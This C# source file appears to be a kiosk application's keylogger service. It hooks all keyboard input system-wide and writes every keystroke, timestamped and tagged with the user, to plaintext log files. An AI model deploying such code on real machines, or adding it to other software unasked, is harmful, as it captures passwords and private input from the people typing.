using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using ApacKiosk.Database;
using ApacKiosk.Utils;

namespace ApacKiosk.Services
{
    public class KeyLogger
    {
        private readonly ConfigManager _config;
        private readonly DatabaseManager _db;
        private Thread _thread;
        private volatile bool _isRunning;
        private int? _currentUserId;
        private readonly StringBuilder _keyBuffer = new StringBuilder();
        private string _currentLogFile;
        private DateTime _currentLogDate;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        private LowLevelKeyboardProc _proc;
        private IntPtr _hookId = IntPtr.Zero;

        public KeyLogger(ConfigManager config, DatabaseManager db)
        {
            _config = config;
            _db = db;
            _proc = HookCallback;
        }

        public void SetCurrentUser(int? userId)
        {
            FlushBuffer();
            _currentUserId = userId;
            EnsureLogFile();
        }

        public void Start()
        {
            if (_isRunning) return;
            _isRunning = true;
            EnsureLogFile();
            _thread = new Thread(RunHookLoop)
            {
                IsBackground = true,
                Name = "KeyLogger",
                ApartmentState = ApartmentState.STA
            };
            _thread.Start();
        }

        public void Stop()
        {
            _isRunning = false;
            if (_hookId != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookId);
                _hookId = IntPtr.Zero;
            }
            FlushBuffer();
            _thread?.Join(3000);
        }

        private void RunHookLoop()
        {
            _hookId = SetHook(_proc);
            System.Windows.Forms.Application.Run();
        }

        private void EnsureLogFile()
        {
            var now = DateTime.Now;
            bool createNew = false;

            if (_config.KeyloggerFileMode == "session")
                createNew = true;
            else if (_config.KeyloggerFileMode == "daily" && _currentLogDate.Date != now.Date)
                createNew = true;
            else if (_currentLogFile == null)
                createNew = true;

            if (createNew)
            {
                FlushBuffer();
                var dir = _config.KeyloggerPath;
                Directory.CreateDirectory(dir);
                var dateStr = now.ToString("yyyyMMdd");
                var userLabel = _currentUserId?.ToString() ?? "system";
                _currentLogDate = now;
                _currentLogFile = Path.Combine(dir, $"keylog_{dateStr}_{userLabel}.txt");
            }
        }

        private void FlushBuffer()
        {
            if (_keyBuffer.Length == 0 || _currentLogFile == null) return;
            try
            {
                File.AppendAllText(_currentLogFile, _keyBuffer.ToString());
                _keyBuffer.Clear();
            }
            catch { }
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using var curProcess = Process.GetCurrentProcess();
            using var curModule = curProcess.MainModule;
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (!_isRunning) return CallNextHookEx(_hookId, nCode, wParam, lParam);

            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                try
                {
                    EnsureLogFile();
                    int vkCode = Marshal.ReadInt32(lParam);
                    var key = MapVirtualKey(vkCode);
                    var userLabel = _currentUserId?.ToString() ?? "system";
                    var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                    var line = $"[{timestamp}] {userLabel}: {key}\r\n";
                    _keyBuffer.Append(line);

                    if (_keyBuffer.Length > 4096)
                        FlushBuffer();
                }
                catch { }
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private static string MapVirtualKey(int vkCode)
        {
            var ctrl = (GetKeyState(0x11) & 0x8000) != 0;
            var shift = (GetKeyState(0x10) & 0x8000) != 0;
            var alt = (GetKeyState(0x12) & 0x8000) != 0;

            var modifiers = "";
            if (ctrl) modifiers += "CTRL+";
            if (alt) modifiers += "ALT+";
            if (shift) modifiers += "SHIFT+";

            return vkCode switch
            {
                0x08 => "[BACKSPACE]",
                0x09 => "[TAB]",
                0x0D => "[ENTER]",
                0x1B => "[ESC]",
                0x20 => "[ESPAÇO]",
                0x21 => "[PGUP]",
                0x22 => "[PGDN]",
                0x23 => "[END]",
                0x24 => "[HOME]",
                0x25 => "[←]",
                0x26 => "[↑]",
                0x27 => "[→]",
                0x28 => "[↓]",
                0x2D => "[INSERT]",
                0x2E => "[DELETE]",
                0x5B => "[WIN-L]",
                0x5C => "[WIN-R]",
                0x70 => "[F1]", 0x71 => "[F2]", 0x72 => "[F3]",
                0x73 => "[F4]", 0x74 => "[F5]", 0x75 => "[F6]",
                0x76 => "[F7]", 0x77 => "[F8]", 0x78 => "[F9]",
                0x79 => "[F10]", 0x7A => "[F11]", 0x7B => "[F12]",
                _ => modifiers.Length > 0 ? $"[{modifiers}{(char)vkCode}]" : $"{(char)vkCode}"
            };
        }

        #region P/Invoke

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
            IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        #endregion
    }
}
